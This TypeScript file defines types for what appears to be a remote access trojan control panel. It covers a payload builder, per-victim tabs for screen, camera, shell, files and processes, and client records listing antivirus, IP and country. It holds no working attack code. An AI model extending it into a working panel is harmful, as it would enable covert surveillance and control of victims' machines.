export type TabId = "overview" | "clients" | "builder" | "chat" | "notifications" | "settings" | "admin";

export type ControlTab = "screen" | "camera" | "shell" | "files" | "processes" | "system" | "fun" | "info";

export interface ClientInfo {
  id: string;
  name: string;
  user: string;
  os: string;
  ip: string;
  country: string;
  countryCode: string;
  status: "online" | "offline" | "idle";
  lastSeen: string;
  cpu: string;
  ram: string;
  gpu: string;
  uptime: string;
  group: string;
  av: string;
  netSpeed: string;
  installed: string;
}

export interface StatsResponse {
  ok: boolean;
  analytics: {
    total: number;
    online: number;
    offline: number;
    idle: number;
    countries: number;
    newToday: number;
    commandsSent: number;
    builds: number;
  };
  clients: ClientInfo[];
}

export interface ClientDetailResponse {
  ok: boolean;
  client: ClientInfo;
  files: { name: string; type: string; size: number | string; modified?: string }[];
  processes: { pid: number; name: string; cpu: string; mem: string; status: string }[];
  commandHistory: { command: string; result: string; ts: number }[];
}

export interface LogEntry {
  id: string;
  type: "info" | "warn" | "success" | "error";
  msg: string;
  ts: number;
}

export interface BuildEntry {
  id: number;
  name: string;
  status: "compiling" | "compiled" | "failed";
  size: number;
  createdAt: number;
}
